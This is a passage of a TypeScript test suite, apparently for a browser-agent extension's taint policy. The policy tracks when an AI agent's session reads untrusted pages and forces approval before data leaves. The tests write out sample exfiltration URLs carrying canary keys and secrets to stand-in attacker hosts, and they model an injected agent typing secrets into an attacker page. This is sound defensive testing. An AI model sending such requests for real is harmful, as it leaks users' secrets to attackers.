
  it('the setting off restores today\'s behaviour', () => {
    const h = harness({ taintExemptLocalPages: false })
    expect(read(h, 's1', [LOCAL])).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([LOCAL])
    // Absent settings (an older stored value read by the policy layer alone) are off too.
    const bare = new PolicyRuntime({ settings: () => ({ siteRules: [], siteDefaultsEnabled: true }), unrestricted: () => true, clearBridgeTaint: vi.fn(async () => {}) })
    const call = { id: 'b', name: 'browser_snapshot', args: {}, sessionId: 's1' }
    bare.hook('b', 's1', true)(call, { reads: [LOCAL], acts: [], pageOrigin: LOCAL })
    expect(bare.recordResult(call, true)).toEqual({ exempt: false })
    expect(bare.get('s1')?.sources).toEqual([LOCAL])
  })

  it('managed policy can force it off, whatever the user set', () => {
    const managed = parseManagedPolicy({ disableLocalTaintExemption: true })
    expect(managed).toMatchObject({ disableLocalTaintExemption: true, disableTrustedTaintExemption: false, active: true })
    const h = harness({}, { managed })
    expect(read(h, 's1', [LOCAL])).toEqual({ exempt: false })
    expect(h.policy.get('s1')).toBeDefined()
    // The other exemption is untouched.
    expect(read(h, 's2', [TRUSTED])).toEqual({ exempt: true, local: false })
    const both = harness({}, { managed: parseManagedPolicy({ disableTrustedTaintExemption: true }) })
    expect(read(both, 's1', [TRUSTED])).toEqual({ exempt: false })
    expect(read(both, 's2', [LOCAL])).toMatchObject({ exempt: true })
  })

  it('F1: a class the connected bridge does not honour is off here too', () => {
    const h = harness()
    // The Host's `devLoop.trustLoopback: false`.
    h.bridge.caps = { local: false, trusted: true }
    expect(read(h, 's1', [LOCAL])).toEqual({ exempt: false })
    expect(read(h, 's2', [TRUSTED])).toMatchObject({ exempt: true })
    // Vouchers off altogether.
    h.bridge.caps = { local: false, trusted: false }
    expect(read(h, 's3', [TRUSTED])).toEqual({ exempt: false })
    expect(h.policy.mayExempt('s4')).toBe(false)
  })

  it('remembers exempt reads across a worker restart, bounded', async () => {
    const storage = memoryStorage()
    const options = {
      settings: (): PolicySettings => ({ siteRules: [], siteDefaultsEnabled: true, taintExemptLocalPages: true, taintLocalOrigins: [LOCAL] }),
      unrestricted: () => false,
      clearBridgeTaint: vi.fn(async () => {}),
      storage: storage.area,
    }
    const before = new PolicyRuntime(options)
    await before.ready
    const first = { id: 'r1', name: 'browser_snapshot', args: {}, sessionId: 's1' }
    before.hook('r1', 's1', false)(first, { reads: [LOCAL], acts: [], pageOrigin: LOCAL })
    expect(before.recordResult(first, true)).toMatchObject({ exempt: true })
    await vi.waitFor(() => { expect(storage.area.set).toHaveBeenCalled() })
    const after = new PolicyRuntime(options)
    await after.ready
    expect(after.taint.exemptReadsOf('s1')).toEqual([LOCAL])
    const second = { id: 'r2', name: 'browser_snapshot', args: {}, sessionId: 's1' }
    after.hook('r2', 's1', false)(second, { reads: [EVIL], acts: [], pageOrigin: EVIL })
    after.recordResult(second, true)
    expect(after.get('s1')?.sources).toEqual([EVIL, LOCAL].sort())
    expect(after.taint.exemptReadsOf('s1')).toEqual([])
    // Past the bound the set counts as unknown, so nothing is ever the only source.
    for (let port = 0; port <= MAX_EXEMPT_READS; port += 1) after.taint.noteExemptRead('s9', [`http://localhost:${String(4000 + port)}`])
    expect(after.taint.exemptReadsOf('s9')).toEqual([UNKNOWN_SOURCE])
    // Clear forgets them with the taint.
    await after.clear('s9')
    expect(after.taint.exemptReadsOf('s9')).toEqual([])
  })
})

describe('sites the user trusts do not taint', () => {
  it('a session that only read trusted sites stays untainted', () => {
    const h = harness()
    expect(read(h, 's1', [TRUSTED])).toEqual({ exempt: true, local: false })
    expect(read(h, 's1', [ALWAYS])).toMatchObject({ exempt: true })
    expect(read(h, 's1', [TAINT_ONLY])).toMatchObject({ exempt: true })
    expect(read(h, 's1', [LOCAL, TRUSTED])).toEqual({ exempt: true, local: true })
    expect(h.policy.get('s1')).toBeUndefined()
  })

  it('a trusted rule from before the exemption taints until the user confirms it (default migration)', () => {
    const h = harness({ taintTrustConfirmed: [] })
    expect(read(h, 's1', [TRUSTED])).toEqual({ exempt: false })
    expect(read(h, 's2', [ALWAYS])).toEqual({ exempt: false })
    expect(h.policy.unconfirmedTrust()).toEqual(['rule:seraph.quest', `origin:${ALWAYS}`])
    h.settings.taintTrustConfirmed = ['rule:seraph.quest', `origin:${ALWAYS}`]
    expect(read(h, 's3', [TRUSTED])).toMatchObject({ exempt: true })
    expect(h.policy.unconfirmedTrust()).toEqual([])
    const immediate = harness({ taintTrustConfirmed: [] }, { trustedMigration: 'immediate' })
    expect(read(immediate, 's1', [TRUSTED])).toMatchObject({ exempt: true })
  })

  it('the blanket unrestricted switch still taints', () => {
    const h = harness({ siteRules: [], trustedActionOrigins: [], taintTrustedSites: [] })
    h.unrestricted.on = true
    const call = { id: 'u', name: 'browser_snapshot', args: {}, sessionId: 's1' }
    // Under unrestricted access the read itself needs no prompt...
    expect(h.policy.hook('u', 's1', true)(call, { reads: [EVIL], acts: [], pageOrigin: EVIL })).toEqual({ kind: 'trust' })
    // ...and it taints all the same.
    expect(h.policy.recordResult(call, true)).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([EVIL])
  })

  it('a session-only allowance still taints (only the persistent Settings lists are consulted)', () => {
    // The approval card's "trust for this session" set lives in the background
    // worker and is never handed to the policy layer.
    const h = harness({ siteRules: [], trustedActionOrigins: [], taintTrustedSites: [] })
    expect(read(h, 's1', ['https://session-allowed.example'])).toEqual({ exempt: false })
    expect(h.policy.get('s1')).toBeDefined()
  })

  it('a trusted page with an untrusted frame included taints', () => {
    const h = harness()
    expect(read(h, 's1', [TRUSTED, EVIL])).toEqual({ exempt: false })
  })

  it('the setting off restores today\'s behaviour, independently of the local-pages setting', () => {
    const h = harness({ taintExemptTrustedSites: false })
    expect(read(h, 's1', [TRUSTED])).toEqual({ exempt: false })
    expect(read(h, 's2', [ALWAYS])).toEqual({ exempt: false })
    expect(read(h, 's3', [TAINT_ONLY])).toEqual({ exempt: false })
    expect(read(h, 's4', [LOCAL])).toMatchObject({ exempt: true })
    expect(h.policy.get('s1')?.sources).toEqual([TRUSTED])
  })
})

describe('the exemption never changes where tainted data may go', () => {
  const risky = (origin: string) => `${origin}/collect?k=sk-canary-800b3920a5708f56`

  it('a tainted session exfiltrating to loopback or to a trusted origin still forces a card', () => {
    const h = harness()
    read(h, 's1', [EVIL])
    for (const sink of [LOCAL, LOCAL_IP, 'http://[::1]:9000', TRUSTED, ALWAYS, TAINT_ONLY]) {
      expect(navigate(h, 's1', risky(sink)).decision.kind, sink).toBe('force')
      const open = { id: `o-${sink}`, name: 'browser_open_tab', args: { url: risky(sink) }, sessionId: 's1' }
      expect(h.policy.evaluate(open, { reads: [], acts: [], destination: risky(sink) }).kind, sink).toBe('force')
      const typing = { id: `t-${sink}`, name: 'browser_type', args: { text: 'secret' }, sessionId: 's1' }
      expect(h.policy.evaluate(typing, { reads: [], acts: [sink], typeTargetOrigin: sink }).kind, sink).toBe('force')
    }
  })

  it('also when the session had read that loopback or trusted origin before it was tainted', () => {
    const h = harness()
    read(h, 's1', [LOCAL])
    read(h, 's1', [TRUSTED])
    read(h, 's1', [EVIL])
    expect(navigate(h, 's1', risky(LOCAL)).decision.kind).toBe('force')
    expect(navigate(h, 's1', risky(TRUSTED)).decision.kind).toBe('force')
    expect(navigate(h, 's1', risky(EVIL)).decision.kind).toBe('force')
  })

  it('the pure rule is unchanged: only the taint\'s only source is exempt as a destination', () => {
    const tainted = { sources: [EVIL], firstTool: 'browser_snapshot', since: 0 }
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url: risky(LOCAL) } }, tainted)).not.toEqual([])
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url: risky(TRUSTED) } }, tainted)).not.toEqual([])
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url: risky(EVIL) } }, tainted)).toEqual([])
  })

  it('F4: a fork or subagent of a session that read exempt pages can never have a single source', () => {
    const h = harness()
    expect(read(h, 'parent', [LOCAL])).toMatchObject({ exempt: true })
    // The Host tells the extension on the child's calls: an ancestor read exempt pages.
    h.policy.noteInheritedExemptReads('child')
    expect(h.policy.get('child')).toBeUndefined() // not tainted by that alone
    read(h, 'child', [EVIL])
    expect(h.policy.get('child')?.sources).toEqual([UNKNOWN_SOURCE, EVIL])
    expect(typeInto(h, 'child', EVIL)).not.toEqual([])
    expect(navigate(h, 'child', risky(EVIL)).decision.kind).toBe('force')
    // Without the Host's word the child's only source would be the attacker page (the reviewed gap).
    read(h, 'unrelated', [EVIL])
    expect(typeInto(h, 'unrelated', EVIL)).toEqual([])
    // A child that is already tainted gains the unknown source too.
    read(h, 'late-child', [EVIL])
    h.policy.noteInheritedExemptReads('late-child')
    expect(h.policy.get('late-child')?.sources).toContain(UNKNOWN_SOURCE)
    // Its own exempt reads stay vouched for (the unknown source is only remembered).
    h.policy.noteInheritedExemptReads('quiet-child')
    expect(read(h, 'quiet-child', [LOCAL])).toMatchObject({ exempt: true })
  })
})

describe('the banner\'s one-click choices', () => {
  function panel(policy: PolicyRuntime, sender: chrome.runtime.MessageSender = { id: 'ext', url: 'chrome-extension://ext/panel/index.html' }) {
    const listeners: Array<(message: unknown) => void> = []
    const posted: Array<Record<string, unknown>> = []
    const port = {
      name: POLICY_PORT_NAME,
      sender,
      postMessage: (message: Record<string, unknown>) => { posted.push(message) },
      disconnect: vi.fn(),
      onMessage: { addListener: (listener: (message: unknown) => void) => { listeners.push(listener) } },
      onDisconnect: { addListener: () => {} },
    } as unknown as chrome.runtime.Port
    policy.connect(port)
    return { posted, port, emit: (message: unknown) => { for (const listener of listeners) listener(message) } }
  }
  const result = (posted: Array<Record<string, unknown>>, id: string) => posted.find((message) => message.type === 'taint.trust.result' && message.id === id)

  it('offers a site only over https on its default port, and only where a choice would change something', () => {
    const h = harness()
    read(h, 's1', [EVIL])
    read(h, 's1', ['https://x.com'])
    read(h, 's1', [LOCAL]) // already exempt: nothing to offer
    read(h, 's1', ['http://plain.example']) // http: never trusted
    read(h, 's1', ['https://x.com:8443']) // not the default port
    read(h, 's1', ['https://192.168.1.20']) // an entry cannot name an address
    read(h, 's1', ['https://www.paypal.com']) // a built-in read-only site: Settings only
    read(h, 's1', ['http://localhost:8080']) // a local address the user has not confirmed
    expect(h.policy.trustable()).toEqual({
      s1: {
        [EVIL]: { kind: 'site', entry: 'evil.example' },
        'https://x.com': { kind: 'site', entry: 'x.com' },
        'http://localhost:8080': { kind: 'local', entry: 'http://localhost:8080' },
      },
    })
    const now = h.policy.exemption()
    expect(trustOfferFor(TRUSTED, now)).toBeUndefined()
    expect(trustOfferFor(UNKNOWN_SOURCE, now)).toBeUndefined()
    expect(trustOfferFor('https://intranet', now)).toBeUndefined()
    expect(trustOfferFor('https://github.com', now)).toBeUndefined() // github.com/settings is a built-in rule
    expect(trustOfferFor(EVIL, { ...now, site: { ...now.site, managed: [{ pattern: 'evil.example', rule: 'ask' }] } })).toBeUndefined()
    // With an exemption off, the matching choice would change nothing: not offered.
    expect(trustOfferFor(EVIL, { ...now, trustedSites: false })).toBeUndefined()
    expect(trustOfferFor('http://localhost:8080', { ...now, localPages: false })).toBeUndefined()
    // Under scope "any" there is nothing to confirm for a local address.
    expect(trustOfferFor('http://localhost:8080', { ...now, loopbackScope: 'any' })).toBeUndefined()
    // A trusted rule waiting for confirmation: the banner can settle it.
    expect(trustOfferFor(TRUSTED, { ...now, trustConfirmed: [] })).toEqual({ kind: 'site', entry: 'seraph.quest' })
  })

  it('F6: "Trust" adds a taint-only entry, never a site rule: approval cards on that site do not change', async () => {
    const h = harness({ siteRules: [], trustedActionOrigins: [], taintTrustedSites: [], taintTrustConfirmed: [] })
    read(h, 's1', [EVIL])
    const click = { id: 'click', name: 'browser_click', args: { index: 1 }, sessionId: 's2' }
    const before = h.policy.evaluate(click, { reads: [], acts: [EVIL], pageOrigin: EVIL })
    expect(before.kind).toBe('default')
    expect(await h.policy.trustSources('s1', [EVIL])).toEqual({ trusted: [EVIL], cleared: true })
    expect(h.saved).toEqual([{ sites: ['evil.example'], localOrigins: [] }])
    expect(h.settings.siteRules).toEqual([])
    expect(h.settings.trustedActionOrigins).toEqual([])
    // Actions on the site still take the ordinary approval flow.
    expect(h.policy.evaluate(click, { reads: [], acts: [EVIL], pageOrigin: EVIL })).toEqual(before)
    // Only the taint side changed: its pages no longer restrict a conversation.
    expect(read(h, 's3', [EVIL])).toMatchObject({ exempt: true })
    expect(read(h, 's4', ['http://evil.example'])).toEqual({ exempt: false })
  })

  it('trusting every source lifts the taint here and on the Host', async () => {
    const h = harness()
    read(h, 's1', [EVIL])
    read(h, 's1', [LOCAL])
    const side = panel(h.policy)
    side.emit({ type: 'taint.trust', id: 't1', sessionId: 's1', origins: [EVIL] })
    await vi.waitFor(() => { expect(result(side.posted, 't1')).toBeDefined() })
    expect(result(side.posted, 't1')).toMatchObject({ ok: true, cleared: true, trusted: [EVIL], key: 's1' })
    expect(h.policy.get('s1')).toBeUndefined()
    expect(h.clearBridgeTaint).toHaveBeenCalledWith('s1')
    // From now on that site does not taint.
    expect(read(h, 's2', [EVIL])).toMatchObject({ exempt: true })
  })

  it('names the sources that are exempt now, so the banner lists only what tainted the conversation', async () => {
    const h = harness()
    expect(read(h, 's1', [LOCAL])).toMatchObject({ exempt: true }) // the user's own local page
    read(h, 's1', [EVIL])
    // The local page stays a source (never the "only source" shortcut) ...
    expect(h.policy.get('s1')?.sources).toEqual([EVIL, LOCAL].sort())
    // ... but it is named as exempt, for display only.
    expect(h.policy.exemptSources()).toEqual({ s1: [LOCAL] })
    const { posted, emit } = panel(h.policy)
    emit({ type: 'taint.subscribe' })
    await vi.waitFor(() => { expect(posted.some((message) => message.type === 'taint.state')).toBe(true) })
    const state = posted.filter((message) => message.type === 'taint.state').at(-1)
    expect(state?.exemptSources).toEqual({ s1: [LOCAL] })
  })

  it('F3: lifting the taint by Trust keeps its sources: a page read later is never the only source', async () => {
    const h = harness()
    const A = 'https://a-site.example'
    expect(read(h, 's1', [LOCAL])).toMatchObject({ exempt: true }) // a secret on localhost
    expect(read(h, 's1', [A])).toEqual({ exempt: false })
    expect(await h.policy.trustSources('s1', [A])).toEqual({ trusted: [A], cleared: true })
    expect(h.policy.get('s1')).toBeUndefined()
    expect(h.policy.taint.exemptReadsOf('s1')).toEqual([A, LOCAL].sort())
    read(h, 's1', [EVIL])
    expect(h.policy.get('s1')?.sources).toEqual([A, EVIL, LOCAL].sort())
    // The attacker page is not the only source: both exfiltration shapes force a card.
    expect(typeInto(h, 's1', EVIL)).not.toEqual([])
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url: `${EVIL}/c?d=SECRET0123456789abcdef` } }, h.policy.get('s1'))).not.toEqual([])
    // Clear, by contrast, is the user saying "forget what this conversation read".
    await h.policy.clear('s1')
    expect(h.policy.taint.exemptReadsOf('s1')).toEqual([])
  })

  it('trusting only some sources leaves the session tainted', async () => {
    const h = harness()
    read(h, 's1', [EVIL])
    read(h, 's1', ['https://x.com'])
    expect(await h.policy.trustSources('s1', [EVIL])).toEqual({ trusted: [EVIL], cleared: false })
    expect(h.policy.get('s1')?.sources).toEqual([EVIL, 'https://x.com'])
    expect(h.clearBridgeTaint).not.toHaveBeenCalled()
    expect(h.policy.trustable()).toEqual({ s1: { 'https://x.com': { kind: 'site', entry: 'x.com' } } })
    expect(await h.policy.trustSources('s1', ['https://x.com'])).toEqual({ trusted: ['https://x.com'], cleared: true })
    expect(h.policy.get('s1')).toBeUndefined()
  })

  it('"these are my pages" remembers a local address and lifts a taint that had no other source', async () => {
    const h = harness({ taintLocalOrigins: [] })
    expect(read(h, 's1', [LOCAL])).toEqual({ exempt: false })
    expect(h.policy.trustable()).toEqual({ s1: { [LOCAL]: { kind: 'local', entry: LOCAL } } })
    expect(await h.policy.trustSources('s1', [LOCAL])).toEqual({ trusted: [LOCAL], cleared: true })
    expect(h.saved).toEqual([{ sites: [], localOrigins: [LOCAL] }])
    expect(h.policy.get('s1')).toBeUndefined()
    expect(read(h, 's2', [LOCAL])).toMatchObject({ exempt: true })
    // Another local address stays unconfirmed.
    expect(read(h, 's3', ['http://localhost:9999'])).toEqual({ exempt: false })
  })

  it('an unknown source can never be trusted: nothing is offered and nothing is saved', async () => {
    const h = harness()
    read(h, 's1', [EVIL])
    h.policy.recordSelection('s1', undefined)
    expect(h.policy.get('s1')?.sources).toEqual([UNKNOWN_SOURCE, EVIL])
    expect(h.policy.trustable()).toEqual({})
    expect(await h.policy.trustSources('s1', [EVIL, UNKNOWN_SOURCE])).toEqual({ trusted: [], cleared: false })
    expect(h.saved).toEqual([])
    expect(h.policy.get('s1')).toBeDefined()
    h.policy.markHostTaint('s2')
    expect(await h.policy.trustSources('s2', [UNKNOWN_SOURCE])).toEqual({ trusted: [], cleared: false })
  })

  it('accepts only sources of that session\'s own record, and only from an extension page', async () => {
    const h = harness()
    read(h, 's1', [EVIL])
    // Not a source of this session: an arbitrary site cannot be trusted through the banner channel.
    expect(await h.policy.trustSources('s1', ['https://attacker.example'])).toEqual({ trusted: [], cleared: false })
    expect(await h.policy.trustSources('s-other', [EVIL])).toEqual({ trusted: [], cleared: false })
    expect(h.saved).toEqual([])
    // A content script (a page's renderer) is refused the port outright.
    const page = panel(h.policy, { id: 'ext', url: 'https://evil.example/', tab: { id: 3 } as chrome.tabs.Tab })
    expect(page.port.disconnect).toHaveBeenCalled()
    page.emit({ type: 'taint.trust', id: 'x', sessionId: 's1', origins: [EVIL] })
    await Promise.resolve()
    expect(h.saved).toEqual([])
    expect(h.policy.get('s1')).toBeDefined()
  })

  it('reports what the panel may offer, and what waits for confirmation, with every state push', async () => {
    const h = harness({ taintTrustConfirmed: [] })
    read(h, 's1', [EVIL])
    const side = panel(h.policy)
    side.emit({ type: 'taint.subscribe' })
    await vi.waitFor(() => { expect(side.posted.some((message) => message.type === 'taint.state')).toBe(true) })
    expect(side.posted.find((message) => message.type === 'taint.state')).toMatchObject({
      records: { s1: { sources: [EVIL] } },
      trustable: { s1: { [EVIL]: { kind: 'site', entry: 'evil.example' } } },
      unconfirmedTrust: ['rule:seraph.quest', `origin:${ALWAYS}`],
    })
  })
})

describe('a loopback dev server the session opened itself', () => {
  const DEV = 'http://127.0.0.1:8471'
  it('counts as local for that session only, without a prior confirmation', () => {
    const h = harness({ taintLocalOrigins: [] })
    const { call } = navigate(h, 'dev', `${DEV}/game.html`)
    expect(h.policy.recordResult(call, true, undefined, { top: DEV, frames: [DEV], opaque: false })).toMatchObject({ exempt: true, local: true })
    // A screenshot (local-only exemption) of that page stays untainted too.
    expect(read(h, 'dev', [DEV], { name: 'browser_screenshot', after: { top: DEV, frames: [DEV], opaque: false } })).toMatchObject({ exempt: true, local: true })
    expect(h.policy.get('dev')).toBeUndefined()
    // Another session that never opened it still needs the confirmation.
    expect(read(h, 'other', [DEV], { after: { top: DEV, frames: [DEV], opaque: false } })).toEqual({ exempt: false })
  })

  it('is not granted to a tainted session, to a failed open, or to a non-loopback URL', () => {
    const h = harness({ taintLocalOrigins: [] })
    read(h, 'web', ['https://evil.example'])
    expect(h.policy.get('web')).toBeDefined()
    const tainted = navigate(h, 'web', `${DEV}/`)
    h.policy.recordResult(tainted.call, true, undefined, { top: DEV, frames: [DEV], opaque: false })
    expect(h.policy.exemption('web').localOrigins).not.toContain(DEV)
    const failed = navigate(h, 'f', `${DEV}/`)
    h.policy.recordResult(failed.call, false, undefined, { top: DEV, frames: [DEV], opaque: false })
    expect(h.policy.exemption('f').localOrigins).not.toContain(DEV)
    const remote = navigate(h, 'r', 'https://example.com/')
    h.policy.recordResult(remote.call, true, undefined, { top: 'https://example.com', frames: ['https://example.com'], opaque: false })
    expect(h.policy.exemption('r').localOrigins).toEqual([])
  })

  it('still taints when a third-party frame is on the page', () => {
    const h = harness({ taintLocalOrigins: [] })
    const { call } = navigate(h, 'dev', `${DEV}/`)
    h.policy.recordResult(call, true, undefined, { top: DEV, frames: [DEV], opaque: false })
    expect(read(h, 'dev', [DEV], { name: 'browser_screenshot', after: { top: DEV, frames: [DEV, 'https://ads.example'], opaque: false } })).toEqual({ exempt: false })
  })
})

describe('opening the agent\'s own dev server needs no card', () => {
  it('covers loopback origins of a clean session only, never the DSH host or a stricter rule', () => {
    const h = harness({ taintLocalOrigins: [], siteRules: [{ pattern: '127.0.0.1:9999', rule: 'blocked' }] }, { neverExemptOrigin: (o) => o === 'http://127.0.0.1:4000' })
    expect(h.policy.opensOwnDevServer('dev', ['http://127.0.0.1:8123'])).toBe(true)
    expect(h.policy.opensOwnDevServer('dev', ['http://localhost:5173'])).toBe(true)
    expect(h.policy.opensOwnDevServer('dev', ['https://example.com'])).toBe(false)
    expect(h.policy.opensOwnDevServer('dev', ['http://127.0.0.1:8123', 'https://example.com'])).toBe(false)
    expect(h.policy.opensOwnDevServer('dev', ['http://127.0.0.1:4000'])).toBe(false)
    expect(h.policy.opensOwnDevServer('dev', [])).toBe(false)
    read(h, 'web', ['https://evil.example'])
    expect(h.policy.opensOwnDevServer('web', ['http://127.0.0.1:8123'])).toBe(false)
  })
})
